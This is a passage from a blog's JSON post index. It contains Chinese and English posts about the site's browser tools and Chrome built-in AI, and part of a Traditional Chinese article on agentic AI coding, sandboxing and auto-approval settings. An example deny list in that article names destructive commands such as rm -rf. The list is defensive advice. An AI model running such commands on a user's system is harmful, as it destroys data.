將經典的四子棋概念帶入三維空間。這不僅僅是關於遊戲玩法——它是關於展示將瀏覽器功能推向極限的進階 3D 視覺化技術和互動機制。 每個遊戲都附帶一個「提示詞」連結，提供 AI 輔助開發過程的透明度。這既具有教育意義，又具有啟發性，是人類與 AI 協作程式設計未來的證明。 🤖 瀏覽器中的 AI 革命 我們左側導航選單中最令人興奮的新增功能是 AI 遊樂場 ——一窺基於網頁的人工智慧未來。AI 需要複雜的伺服器設定或昂貴的 API 呼叫的日子已經一去不復返了。Chrome 的內建 AI 功能開啟了一個新的前沿，而我們正在開拓探索。 我們的 AI 區塊具有兩個突破性的工具： 文字摘要器 – 想像擁有一個個人助理，可以將冗長的文件提煉成簡潔、可操作的見解。無論您需要會議的重點、社群媒體的 TL;DR，還是內容的引人注目的預告，此工具都利用 Chrome 的原生摘要 API 在幾秒鐘內提供結果。即時代幣追蹤增加了一層透明度，讓進階使用者會欣賞。 提示 API 遊樂場 – 這是真正魔法發生的地方。直接存取 Gemini Nano，Google 的輕量級語言模型，完全在您的瀏覽器中執行。沒有資料離開您的裝置，沒有隱私問題，只有純粹的 AI 互動，具有串流回應和完整的對話歷史記錄。這就像擁有 ChatGPT，但更快、更私密且完全免費。 注意：這些工具需要啟用實驗性標誌的 Chrome Beta 或 Canary——我們實際上生活在未來。 接下來是什麼？ 這只是開始。隨著瀏覽器功能的成熟，AI 區塊將會擴展。工具集合將根據社群回饋和新興的開發者需求而增長。遊戲區塊將展示越來越複雜的 AI 輔助創造力範例。 我們不僅僅是記錄未來——我們正在建構它，一次一個工具。 探索左側導航選單中的新區塊，發現當尖端技術與實際應用相遇時可能實現的事情。基於網頁的生產力的未來就在這裡，它比我們想像的更令人興奮。","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Development","slug":"Development","permalink":"https://neo01.com/tags/Development/"}],"lang":"zh-TW"},{"title":"工具、游戏与浏览器内置 AI 游乐场","slug":"2025/10/Tools-Games-And-Browser-Built-In-AI-zh-CN","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-CN/2025/10/Tools-Games-And-Browser-Built-In-AI/","permalink":"https://neo01.com/zh-CN/2025/10/Tools-Games-And-Browser-Built-In-AI/","excerpt":"探索实用开发工具、3D 游戏与 Chrome 内置 AI 的强大功能。无需服务器,完全在浏览器中运行的 AI 助手正在改变网页开发。","text":"数字环境正以惊人的速度演进，而我们这个简单的博客刚刚实现了一次量子跃进。从一个简单的想法集合，转变为一个全面的数字工具包，利用浏览器内置 AI 的尖端力量、实用的开发者工具和引人入胜的互动游戏。 🛠️ 真正重要的工具 工具 区块代表了多年来开发者挫折感的精华。我们都经历过——需要快速转换文字大小写、验证 JSON 或计算文件权限，却发现自己淹没在充满广告的臃肿在线工具中。 我们精选的集合涵盖六个重要类别： 文字处理 – 从具有 LLM 令牌估算的全面文字统计到 ASCII 艺术生成和 NATO 字母转换。这些不仅仅是实用工具；它们是生产力倍增器。 编码与格式化 – Base64 转换、URL 编码、HTML 实体处理和具有高级格式化选项的 JSON 验证。简洁、快速且可靠。 安全与分析 – 具有七种不同算法的加密哈希和真正有意义的 URL 解析工具。 系统管理 – Chmod 计算器、crontab 生成器和系统管理员会立即加入书签的 IPv4 子网计算器。 文件分析 – 我们的皇冠宝石：具有拖放功能的 PNG 元数据检查器和 EXIF 提取器。上传图像并发现其隐藏的秘密——从相机设置到嵌入的元数据。 实用工具 – 温度转换器、世界时钟、设备信息，甚至还有为那些用流程图思考的人准备的 Mermaid 图表编辑器。 每个工具都是以简单和有效性的理念构建的。无需注册，无需数据收集，只有纯粹的功能性。 🎮 引人入胜且具挑战性的游戏 游戏 区块对于科技博客来说可能看起来是个奇怪的补充，但这种疯狂是有方法的。这些不仅仅是浪费时间的东西；它们是当 AI 协助人类创造力时可能实现的展示。 我们的旗舰游戏 立体四子棋 将经典的四子棋概念带入三维空间。这不仅仅是关于游戏玩法——它是关于展示将浏览器功能推向极限的高级 3D 可视化技术和交互机制。 每个游戏都附带一个&quot;提示词&quot;链接，提供 AI 辅助开发过程的透明度。这既具有教育意义，又具有启发性，是人类与 AI 协作编程未来的证明。 🤖 浏览器中的 AI 革命 我们左侧导航菜单中最令人兴奋的新增功能是 AI 游乐场 ——一窥基于网页的人工智能未来。AI 需要复杂的服务器设置或昂贵的 API 调用的日子已经一去不复返了。Chrome 的内置 AI 功能开启了一个新的前沿，而我们正在开拓探索。 我们的 AI 区块具有两个突破性的工具： 文字摘要器 – 想象拥有一个个人助理，可以将冗长的文档提炼成简洁、可操作的见解。无论您需要会议的重点、社交媒体的 TL;DR，还是内容的引人注目的预告，此工具都利用 Chrome 的原生摘要 API 在几秒钟内提供结果。实时令牌跟踪增加了一层透明度，让高级用户会欣赏。 提示 API 游乐场 – 这是真正魔法发生的地方。直接访问 Gemini Nano，Google 的轻量级语言模型，完全在您的浏览器中执行。没有数据离开您的设备，没有隐私问题，只有纯粹的 AI 交互，具有流式响应和完整的对话历史记录。这就像拥有 ChatGPT，但更快、更私密且完全免费。 注意：这些工具需要启用实验性标志的 Chrome Beta 或 Canary——我们实际上生活在未来。 接下来是什么？ 这只是开始。随着浏览器功能的成熟，AI 区块将会扩展。工具集合将根据社区反馈和新兴的开发者需求而增长。游戏区块将展示越来越复杂的 AI 辅助创造力示例。 我们不仅仅是记录未来——我们正在构建它，一次一个工具。 探索左侧导航菜单中的新区块，发现当尖端技术与实际应用相遇时可能实现的事情。基于网页的生产力的未来就在这里，它比我们想象的更令人兴奋。","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Development","slug":"Development","permalink":"https://neo01.com/tags/Development/"}],"lang":"zh-CN"},{"title":"Tools, Games and Browser Built-in AI Playground","slug":"2025/10/Tools-Games-And-Browser-Built-In-AI","date":"un44fin44","updated":"un66fin66","comments":true,"path":"2025/10/Tools-Games-And-Browser-Built-In-AI/","permalink":"https://neo01.com/2025/10/Tools-Games-And-Browser-Built-In-AI/","excerpt":"Discover practical developer tools, 3D games, and Chrome's built-in AI power. No servers needed - AI assistants running entirely in your browser are changing web development forever.","text":"The digital landscape is evolving at breakneck speed, and our humble blog has just taken a quantum leap forward. What started as a simple collection of thoughts has transformed into a comprehensive digital toolkit that harnesses the cutting-edge power of browser-built AI, practical developer tools, and engaging interactive games. 🛠️ Tools That Actually Matter The Tools section represents years of developer frustration distilled into elegant solutions. We’ve all been there – needing to quickly convert text cases, validate JSON, or calculate file permissions, only to find ourselves drowning in bloated online tools riddled with ads. Our curated collection spans six essential categories: Text Processing – From comprehensive text statistics with LLM token estimation to ASCII art generation and NATO alphabet conversion. These aren’t just utilities; they’re productivity multipliers. Encoding &amp; Formatting – Base64 conversion, URL encoding, HTML entity handling, and JSON validation with advanced formatting options. Clean, fast, and reliable. Security &amp; Analysis – Cryptographic hashing with seven different algorithms and URL parsing tools that actually make sense. System Administration – Chmod calculators, crontab generators, and IPv4 subnet calculators that system administrators will bookmark immediately. File Analysis – Our crown jewels: PNG metadata checker and EXIF extractor with drag-and-drop functionality. Upload an image and discover its hidden secrets – from camera settings to embedded metadata. Utilities – Temperature converters, world clocks, device information, and even a Mermaid diagram editor for those who think in flowcharts. Every tool is built with a philosophy of simplicity and effectiveness. No registration required, no data collection, just pure functionality. 🎮 Games That Engage and Challenge The Games section might seem like an odd addition to a tech blog, but there’s method to this madness. These aren’t just time-wasters; they’re showcases of what’s possible when AI assists human creativity. Our flagship game, Connected 4 3D, takes the classic Connect Four concept and launches it into three dimensions. It’s not just about the gameplay – it’s about demonstrating advanced 3D visualization techniques and interactive mechanics that push browser capabilities to their limits. Each game comes with a “prompt” link, offering transparency into the AI-assisted development process. It’s educational, inspirational, and a testament to the collaborative future of human-AI programming. 🤖 The AI Revolution in Your Browser The most exciting addition to our left navigation menu is the AI Playground – a glimpse into the future of web-based artificial intelligence. Gone are the days when AI required complex server setups or expensive API calls. Chrome’s built-in AI capabilities have opened up a new frontier, and we’re pioneering the exploration. Our AI section features two groundbreaking tools: Text Summarizer – Imagine having a personal assistant that can distill lengthy documents into concise, actionable insights. Whether you need key points for a meeting, a TL;DR for social media, or a compelling teaser for your content, this tool leverages Chrome’s native Summarization API to deliver results in seconds. The real-time token tracking adds a layer of transparency that power users will appreciate. Prompt API Playground – This is where the magic truly happens. Direct access to Gemini Nano, Google’s lightweight language model, running entirely in your browser. No data leaves your device, no privacy concerns, just pure AI interaction with streaming responses and full conversation history. It’s like having ChatGPT, but faster, more private, and completely free. Note: These tools require Chrome Beta or Canary with experimental flags enabled – we’re literally living in the future here. What’s Next? This is just the beginning. The AI section will expand as browser capabilities mature. The tools collection will grow based on community feedback and emerging developer needs. The games section will showcase increasingly sophisticated examples of AI-assisted creativity. We’re not just documenting the future – we’re building it, one tool at a time. Explore the new sections in the left navigation menu and discover what’s possible when cutting-edge technology meets practical application. The future of web-based productivity is here, and it’s more exciting than we ever imagined.","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Development","slug":"Development","permalink":"https://neo01.com/tags/Development/"}],"lang":"en"},{"title":"代理式編碼的崛起：AI 驅動的軟體工程","slug":"2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering-zh-TW","date":"un66fin66","updated":"un00fin00","comments":true,"path":"/zh-TW/2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering/","permalink":"https://neo01.com/zh-TW/2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering/","excerpt":"從複製貼上到自主代理:AI 如何重新定義軟體開發,讓開發者從程式碼打字員轉變為解決方案架構師。探索 YOLO 模式、沙盒環境與代理式編碼的未來。","text":"還記得你第一次發現 ChatGPT 可以寫程式碼嗎？你可能做了數百萬開發人員做的事情：複製你的需求，貼到聊天中，然後驚訝地看著可運作的程式碼出現。然後是除錯舞蹈——將錯誤訊息複製回 AI，將「修復」的程式碼貼到你的編輯器中，只是在新錯誤出現時重複這個循環。 那只是開始。 從簡單的複製貼上工作流程開始的東西已經演變成更強大的東西：代理式編碼。這些不再只是智慧自動完成工具或有用的聊天機器人。今天的 AI 代理可以讀取你的整個程式碼庫、理解你的專案結構、同時編寫和修改多個檔案、執行測試、修復錯誤，甚至部署應用程式——所有這些都不需要你動一根手指。 想像告訴 AI「為我建立一個帶使用者認證的待辦事項應用程式」，一小時後回來發現一個完整的、經過測試的、已部署的應用程式。這不是科幻小說——這正在使用支援「YOLO 模式」（You Only Live Once）的工具發生，其中 AI 代理在每一步都不需要請求許可的情況下自主工作。 💡 什麼是 YOLO 模式？YOLO（You Only Live Once）模式允許 AI 代理在延長的時間內自主工作，而不需要在每一步都請求許可。代理做出決策、編寫程式碼、執行測試並獨立修復問題，而你專注於其他任務。把它想像成讓你的 AI 助手進入自動駕駛模式。 從複製貼上到自主代理：旅程 轉型開始得很無辜。在 2022 年底，全球開發人員發現他們可以用簡單的英語描述他們的編碼問題並收到可運作的解決方案。這是複製貼上時代的誕生——粗糙但革命性。開發人員會將需求複製到 ChatGPT，將生成的程式碼貼到他們的編輯器中，然後將錯誤訊息複製回 AI 進行除錯。這是一個繁瑣的舞蹈，但它有效。 真正的突破來自 AI 進入我們的開發環境。與其在瀏覽器標籤和文字編輯器之間切換，GitHub Copilot 和 Amazon CodeWhisperer 等工具將 AI 直接帶入 IDE。這標誌著建議時代——AI 可以看到你的整個檔案，理解你的編碼風格，並建議在上下文中真正有意義的完成。複製貼上舞蹈演變成更優雅的華爾茲，AI 和開發人員在同一個工作空間中和諧工作。 然後是遊戲規則改變者：自主代理時代。這些不再只是建議引擎——它們是能夠讀取整個程式碼庫、理解專案架構並做出獨立決策的數位同事。現代工具可以同時重構跨數十個檔案的認證系統，更新匯入、修復類型定義並在整個過程中保持一致性。它們可以在卡住時瀏覽文件，執行終端命令來測試自己的程式碼，甚至將應用程式部署到生產環境。 timeline title AI 驅動編碼的演變 2022-2023 : 複製貼上時代 : 在瀏覽器和編輯器之間手動複製 : 重複的除錯循環 2023-2024 : 建議時代 : IDE 整合的 AI 助手 : 上下文感知的程式碼完成 : 即時建議 2024-2025 : 自主代理時代 : 多檔案編輯 : 獨立決策 : YOLO 模式自動化 這不僅僅是關於更快地編寫程式碼——這是關於從根本上重新定義成為軟體開發人員的意義。當 AI 處理常規實作細節時，開發人員從程式碼打字員轉變為解決方案架構師，專注於創意問題解決而不是語法記憶。 代理式編碼實際上如何運作 要理解代理式編碼，想像有一個高技能的開發人員坐在你旁邊，他可以看到你的整個專案，理解你的目標，並在你專注於更大的決策時獨立工作。但與其是人類，它是一個具有幾個相互連接的元件協同工作的 AI 系統。 在其核心，代理式編碼系統透過一個持續的循環運作：觀察 → 計劃 → 行動 → 反思。代理首先觀察你的程式碼庫、需求和當前狀態。然後它建立一個行動計劃，透過編寫或修改程式碼來執行該計劃，並反思結果以確定下一步。這個循環重複，直到任務完成或需要人工干預。 graph LR A([🔍 觀察分析程式碼庫和需求]) --> B([🎯 計劃建立策略和方法]) B --> C([⚡ 行動編寫和修改程式碼]) C --> D([💭 反思評估結果並調整]) D --> A style A fill:#e1f5ff,stroke:#0288d1,stroke-width:2px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px 魔法透過複雜的上下文管理發生。與忘記先前對話的簡單聊天機器人不同，代理式系統維護你的專案結構、編碼模式、先前決策甚至你的個人偏好的持久記憶。當你要求代理「新增使用者認證」時，它不只是生成通用程式碼——它分析你現有的架構，識別要修改的適當檔案，理解你的資料庫架構，並以與你專案風格一致的方式實作認證。 🎬 真實世界情境你告訴代理：「新增使用者登入，使用電子郵件和密碼。」 代理： 觀察你現有的資料庫結構並找到使用者表 計劃建立登入路由、認證中介軟體和密碼雜湊 行動修改 5 個檔案：路由、控制器、模型、中介軟體和測試 反思執行測試，發現缺少匯入，並自動修復 所有這些都在幾分鐘內發生，而你不需要觸碰一行程式碼。 什麼造就了一個優秀的代理式編碼工具？ 並非所有 AI 編碼工具都是平等的。理解什麼將基本程式碼生成器與真正的代理式系統區分開來，有助於你為你的需求選擇正確的工具。讓我們探索定義現代代理式編碼平台的基本能力和品質標準。 核心能力 多檔案程式碼生成和編輯：系統必須同時讀取、理解和修改多個檔案，同時在整個程式碼庫中保持一致性。這包括更新匯入、修復類型定義並確保架構一致性。 自主任務執行：除了程式碼生成，代理必須執行終端命令、執行測試、安裝相依項並與外部服務互動。它們應該處理完整的開發工作流程，而不僅僅是編碼部分。 上下文感知決策：系統必須理解專案上下文，包括現有模式、架構決策和編碼標準。它應該做出與專案既定慣例一致的決策，而不是生成通用解決方案。 錯誤檢測和自我修正：當程式碼無法編譯或測試中斷時，代理必須診斷問題、理解錯誤訊息並自主實作修復。這包括除錯跨多個檔案的複雜多步驟問題。 與開發工具整合：與 IDE、版本控制系統、套件管理器和部署管道的無縫整合。代理應該在現有的開發人員工作流程中工作，而不是需要全新的流程。 品質標準 效能和回應性：代理必須為簡單任務提供近乎即時的回饋，同時在合理的時間範圍內處理複雜的多檔案操作。使用者期望程式碼完成的即時回應和較大重構任務的快速周轉。 可靠性和一致性：系統必須在會話之間產生一致的高品質程式碼。為相同問題生成不同解決方案的代理會破壞開發人員的信心和專案的可維護性。 安全性和隱私：用於程式碼分析的企業級安全性，具有本地部署選項和嚴格的資料處理政策。開發人員需要確保專有程式碼保持機密和安全。 ⚠️ 安全考量AI 編碼工具通常需要存取你的原始碼和內部文件。在採用任何工具之前： 驗證供應商的資料處理政策 檢查敏感專案是否可以本地部署 了解哪些資料被發送到外部伺服器 審查你組織的安全要求 在可能的情況下考慮本地處理程式碼的工具 可擴展性：系統必須處理不同大小的專案，從小腳本到擁有數百萬行程式碼的企業應用程式，而不會降低效能或準確性。 客製化和適應性：靈活的配置選項，用於編碼標準、架構偏好和團隊特定要求。代理應該適應不同的程式語言、框架和開發方法論。 AI 模型的角色：推理模型 vs 指令模型 並非所有 AI 模型在編碼任務中都是平等的。現代代理式編碼工具通常在工作的不同階段使用不同類型的 AI 模型，理解這一點有助於你更有效地使用這些工具。 推理模型專為系統化問題解決和規劃而設計。它們擅長將複雜任務分解為步驟、理解專案架構並做出策略決策。把它們想像成「架構師」——它們弄清楚需要做什麼以及按什麼順序。這些模型較慢但更徹底，使它們非常適合規劃階段。 指令模型（也稱為聊天或完成模型）針對快速程式碼生成和遵循特定指示進行了最佳化。它們擅長理解自然語言需求並根據明確的指示快速生成程式碼。把它們想像成「建造者」——一旦他們知道要建造什麼，他們就會快速建造。這些模型最適合速度重要的行動階段。 📊 實踐中的模型選擇一些進階工具讓你選擇使用哪個模型來執行不同的任務： 計劃模式：使用推理模型來分析你的請求並建立詳細的實作計劃 行動模式：使用指令模型根據計劃快速生成程式碼 這種混合方法結合了推理模型的策略思考與指令模型的速度，為你提供兩全其美的優勢。 進階功能：安全性和控制 隨著代理式編碼工具變得更強大和自主，安全性和控制的進階功能已變得至關重要。讓我們探索現代工具如何在為你提供對 AI 行動的細粒度控制的同時保護你的系統。 沙盒環境：安全執行區域 當 AI 代理執行終端命令或執行程式碼時，它們可能會損害你的系統——無論是意外還是透過惡意程式碼生成。沙盒環境透過建立隔離的執行區域來解決這個問題，AI 可以在其中工作而不會冒險影響你的主系統。 沙盒如何運作：把沙盒想像成一個虛擬遊樂場，AI 可以在其中建造、測試和實驗，而不會影響外部的任何東西。如果 AI 生成崩潰、刪除檔案或行為異常的程式碼，損害會留在沙盒內。 基於 Docker 的沙盒：一些工具使用 Docker 容器作為沙盒。例如，Gemini CLI 可以啟動一個 Docker 容器，所有 AI 生成的程式碼都在其中執行。這提供了強大的隔離，因為： 容器有自己的檔案系統，與你的電腦分開 網路存取可以被限制或監控 資源使用（CPU、記憶體）可以被限制 如果出現問題，整個環境可以立即重置 你的實際專案檔案保持不變，直到你明確批准變更 這種方法被認為是高度安全的，因為即使 AI 生成惡意程式碼，它也只能影響臨時容器，而不是你的實際開發環境或個人檔案。 graph TB A([👤 開發人員給出指示]) --> B([🤖 AI 代理生成程式碼]) B --> C([🐳 Docker 沙盒隔離環境]) C --> D{✅ 測試通過？} D -->|是| E([📋 向開發人員呈現結果]) D -->|否| B E --> F{開發人員批准？} F -->|是| G([💾 應用到實際專案]) F -->|否| H([❌ 丟棄變更]) style C fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style G fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style H fill:#ffebee,stroke:#c62828,stroke-width:2px 🛡️ 為什麼沙盒對企業很重要沒有沙盒，具有終端存取權限的 AI 代理可能會： 意外刪除重要檔案 安裝不需要的軟體 修改系統配置 消耗過多資源 執行具有安全漏洞的程式碼 對於企業團隊，像 Gemini CLI 和 Vibe 這樣具有基於 Docker 的沙盒的工具提供了在整個組織中安全部署 AI 編碼助手所需的安全隔離。沙盒確保即使 AI 犯錯或生成有問題的程式碼，你的生產系統和敏感資料仍然受到保護。 細粒度自動批准：受控自主性 雖然 YOLO 模式聽起來令人興奮，但大多數開發人員希望控制 AI 可以自動執行的操作。細粒度自動批准系統讓你精確定義 AI 可以在不請求許可的情況下採取哪些行動。 行動級控制：像 Cline 這樣的現代工具允許你為不同類型的行動設定批准規則： 始終自動批准：讀取檔案、搜尋程式碼、分析結構 先詢問：編寫或修改檔案、安裝套件 永不自動批准：刪除檔案、執行部署命令、存取外部 API 這意味著你可以讓 AI 在安全操作上自主工作，同時對潛在風險的行動保持監督。 ⚠️ 自動批准安全功能Cline 包含一個內建的安全機制，當會話中自動批准了太多行動時會警告你。這可以防止「批准疲勞」，你可能會意外配置過於寬鬆的設定。如果你看到這個警告，這是審查你的自動批准配置並確保你沒有讓你的專案面臨不必要風險的好時機。 範例工作流程：你可能會配置你的工具： 自動批准：讀取專案中的任何檔案 自動批准：在沙盒中執行測試 請求許可：修改原始碼檔案 請求許可：安裝新相依項 始終阻止：刪除檔案或資料夾 使用這些設定，AI 可以自由分析你的整個程式碼庫並執行測試，但必須在進行實際變更之前詢問。 MCP 伺服器工具自動批准 模型上下文協定（MCP）伺服器透過提供專門的工具來擴展 AI 能力——如資料庫存取、API 整合或自訂工作流程。細粒度控制在這裡變得更加重要。 **什麼是 MCP？**把 MCP 想像成一種為 AI 代理提供超越基本編碼的專門工具的方式。MCP 伺服器可能提供： 資料庫查詢能力 存取你公司的內部 API 與專案管理工具整合 特定於你組織的自訂業務邏輯 每個伺服器的批准設定：進階工具讓你為每個 MCP 伺服器分別配置自動批准： 文件 MCP 伺服器：自動批准所有行動（安全、唯讀） 資料庫 MCP 伺服器：需要批准寫入操作，自動批准讀取 部署 MCP 伺服器：永不自動批准（風險太大） 測試 MCP 伺服器：僅在沙盒內自動批准 這種細粒度控制意味著你可以安全地啟用強大的整合，而不必擔心 AI 對關鍵系統進行未經授權的變更。 🎯 真實世界的自動批准配置Web 開發專案的典型安全配置： 檔案操作： ✅ 自動批准：讀取任何檔案 ✅ 自動批准：在 /tests 目錄中建立/修改檔案 ⚠️ 先詢問：修改 /src 目錄中的檔案 ❌ 永不批准：刪除檔案、修改 .git 目錄 終端命令： ✅ 自動批准：npm test、npm run lint ⚠️ 先詢問：npm install、git commit ❌ 永不批准：rm -rf、git push、部署命令 MCP 工具： ✅ 自動批准：文件搜尋、程式碼分析 ⚠️ 先詢問：資料庫查詢、API 呼叫 ❌ 永不批准：生產資料庫存取、支付處理 平衡自主性和安全性 有效代理式編碼的關鍵是在自主性和控制之間找到正確的平衡： 過於限制：如果你需要批准每個行動，你就失去了自主代理的效率優勢。你會花更多時間點擊「批准」而不是實際開發。 過於寬鬆：如果你自動批准所有內容，你就會冒 AI 犯錯的風險，這可能會破壞你的專案、損害安全性或導致資料遺失。 恰到好處：根據風險級別配置自動批准： 讀取操作和分析的高自主性 測試程式碼和文件的中等自主性 生產程式碼變更的低自主性 破壞性操作或外部整合沒有自主性 隨著你對 AI 工具的經驗增加並建立對其能力的信任，你可以逐漸擴展自動批准設定以提高效率，同時保持安全性。 🎓 自動批准的學習路徑從保守開始並逐漸擴展： 第 1 週：手動批准所有內容，了解 AI 做什麼 第 2 週：自動批准檔案讀取和程式碼分析 第 3 週：自動批准測試檔案修改 第 4 週：在沙盒中自動批准安全的終端命令 第 2 個月以上：根據你的舒適度和專案需求進行客製化 這種漸進的方法在保持安全性的同時建立信心。 AI 驅動的開發環境 AI 編碼工具市場已經爆炸式增長，平台提供各種功能和能力。雖然特定工具快速演變，但理解環境有助於你做出明智的選擇。 主要參與者比較 GitHub Copilot 優勢：深度 IDE 整合、大量訓練資料、企業功能 劣勢：有限的自主性，需要人工指導 最適合：傳統結對程式設計增強 Cursor 優勢：具有 AI 優先設計的原生 IDE、出色的 UX、多檔案編輯 劣勢：較新的生態系統、有限的擴充功能 最適合：想要 AI 原生編碼環境的開發人員 Continue 優勢：開源、可客製化、適用於任何 IDE 劣勢：需要更多設定、較不精緻的 UX 最適合：想要控制和客製化的開發人員 Cline（前身為 Claude Dev） 優勢：出色的推理、檔案系統存取、終端整合 劣勢：僅限於 Claude 模型、僅限 VS Code 最適合：複雜的重構和架構變更 AWS Q Developer 優勢：AWS 整合、企業安全性、多語言支援 劣勢：主要專注於 AWS、較新進入市場 最適合：以 AWS 為中心的開發團隊 AWS Kiro 優勢：基於規格的開發（AI 從需求生成規格，然後建立實作計劃）、進階推理 劣勢：早期階段、有限的可用性、沒有 YOLO 模式或沙盒 最適合：規格驅動的開發、需要詳細規劃的複雜專案 Gemini CLI 優勢：Google 的多模態能力、免費層級、用於企業級安全性的 Docker 沙盒 劣勢：僅限命令列、有限的 IDE 整合 最適合：需要安全沙盒執行的企業團隊、腳本自動化、以 CLI 為主的工作流程 Vibe 優勢：用於安全執行的沙盒環境、現代架構 劣勢：較新進入市場、較小的社群 最適合：優先考慮安全性和隔離執行環境的團隊 主要功能比較 功能 Copilot Cursor Continue Cline AWS Q Kiro Gemini CLI Vibe 記憶庫 ✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 自訂規則 ✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ MCP 伺服器 ✅ ❌ ✅ ✅ ❌ ✅ ✅ ❓ YOLO 模式 ❌ ✅ ❌ ✅ ❌ ❌ ✅ ❓ 沙盒 ❌ ❌ ❌ ❌ ✅ ❌ ✅ ✅ 多模型 ✅ ✅ ✅ ❌ ❌ ✅ ✅ ❓ 細粒度自動批准 ❌ ❌ ❌ ✅ ❌ ❓ ❓ ❓ 基於規格的開發 ❌ ❌ ❌ ❌ ❌ ✅ ❌ ❌ ⚠️ 功能比較準確性此比較反映了撰寫時的能力，但 AI 編碼環境以驚人的速度演變。今天最先進的功能明天可能會成為標準，新功能每月都會出現。工具經常新增以前是競爭對手獨有的功能。在做出工具決策之前，請務必檢查最新文件，並預期此表格在幾個月內會部分過時。 進階功能說明 記憶庫：跨會話的持久上下文，從你的程式碼庫模式中學習並記住你的偏好。 自訂規則：專案特定的編碼標準和偏好，指導 AI 行為以符合你團隊的慣例。 MCP 伺服器：模型上下文協定，用於使用外部工具（如資料庫、API 和自訂工作流程）擴展能力。 YOLO 模式：無需確認提示的自主執行，允許 AI 在延長的時間內獨立工作。 沙盒：用於安全程式碼執行和測試的隔離環境（通常基於 Docker），而不會冒險影響你的主系統。 多模型：能夠在不同任務之間切換不同的 AI 模型（推理模型 vs 指令模型）。 細粒度自動批准：對 AI 可以自動執行哪些行動的細粒度控制，包括每個 MCP 伺服器的批准設定。像 Cline 這樣的工具在自動批准太多行動時提供警告，有助於防止過於寬鬆的配置。 基於規格的開發：AI 首先從自然語言需求生成詳細規格，然後根據這些規格建立實作計劃。這種兩階段方法確保需求和實作之間更好的一致性，減少誤解和返工。 哪個工具適合你的需求？ 對於初學者 推薦：GitHub Copilot 或 Cursor 溫和的學習曲線、出色的文件、強大的社群支援 對於有經驗的開發人員 推薦：Continue 或 Cline 最大的控制和客製化、進階代理能力、開源靈活性 對於企業團隊 推薦：Gemini CLI、AWS Q Developer 或 GitHub Copilot Enterprise Gemini CLI 提供基於 Docker 的沙盒以實現最大的安全隔離 AWS Q 和 Copilot 提供企業安全性、合規性、團隊協作、稽核追蹤和治理 對於規格驅動的專案 推薦：AWS Kiro 基於規格的開發確保在實作之前正確理解需求 非常適合複雜專案，其中明確的規格減少了昂貴的返工 對於實驗性專案 推薦：Cursor 或 Vibe 最先進的代理功能、自主開發能力 Vibe 提供沙盒以進行安全實驗 📝 工具演變注意事項AI 編碼工具環境變化迅速。新功能每月出現，今天的限制通常會成為明天的能力。專注於理解核心概念而不是特定工具功能，因為即使工具演變，這些原則仍然保持不變。 轉變軟體開發生命週期 AI 不僅僅是改變我們編寫程式碼的方式——它正在革新軟體開發的每個階段。傳統的軟體開發生命週期（SDLC）正在從線性流程轉變為持續最佳化系統，其中 AI 在每個階段提供智慧、自動化和回饋。 需求階段 AI 工具現在可以使用自然語言處理解析利益相關者對話和文件，檢測歧義、衝突和缺失的需求。它們可以自動生成具有可追溯性連結的使用者故事，幫助團隊比以往更快地從模糊的想法轉變為具體的規格。 基於規格的開發：像 AWS Kiro 這樣的工具透過從自然語言需求生成正式規格來進一步推進這一點。AI 首先建立一個詳細的規格文件，捕獲所有需求、約束和驗收標準。只有在審查和批准規格之後，它才會生成實作計劃。這種兩階段方法提供了顯著的優勢： 減少誤解：在編寫任何程式碼之前審查規格，及早發現需求差距 更好的一致性：利益相關者可以驗證規格而不需要理解程式碼 成本節省：修復規格錯誤比重構已實作的程式碼便宜得多 可追溯性：每個程式碼變更都可以追溯到規格中的特定需求 文件：規格作為與實作保持同步的活文件 設計階段 模式挖掘和約束推理允許 AI 提出架構、估計可擴展性和成本，並在流程早期提出安全問題。與其花費數週時間編寫設計文件，團隊可以在幾小時內探索多個架構選項。 實作階段 這是代理式編碼真正閃耀的地方。生成式編碼、語義搜尋、自動重構和政策強制執行的程式碼助手加速交付，同時自動強制執行風格指南、授權合規性、安全最佳實踐和效能最佳化。 測試階段 AI 根據風險和影響優先考慮測試案例，生成合成測試資料，執行突變測試以發現覆蓋率中的差距，甚至分類不穩定的測試。這意味著更好的測試覆蓋率，而手動工作更少。 部署階段 預測分析調整部署策略、設定回滾觸發器並最佳化容量和成本。基礎設施即程式碼在部署之前自動檢查配置漂移和合規性問題。 營運階段 AI 營運（AIOps）關聯日誌、追蹤和指標以減少平均恢復時間（MTTR）並保護服務級別目標（SLO）。當問題發生時，AI 通常可以比人工操作員更快地診斷並建議修復。 graph TB A([📋 需求NLP 解析和使用者故事]) --> B([🏗️ 設計架構提案]) B --> C([💻 實作代理式編碼]) C --> D([🧪 測試AI 優先考慮的測試案例]) D --> E([🚀 部署預測分析]) E --> F([⚙️ 營運AIOps 監控]) F -.回饋.-> A style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style B fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#fce4ec,stroke:#c2185b,stroke-width:2px style F fill:#e0f2f1,stroke:#00796b,stroke-width:2px 好處和優勢 AI 整合到軟體開發中提供的實際好處超越了單純的生產力提升： 效率和速度：自動化重複的編碼和測試任務可以將開發時間表縮短 30-50%，使團隊能夠更快地交付功能並更快地回應市場需求。 增強的協作：即時 AI 協助彌合技術和非技術團隊成員之間的差距。產品經理可以用簡單的語言描述功能，AI 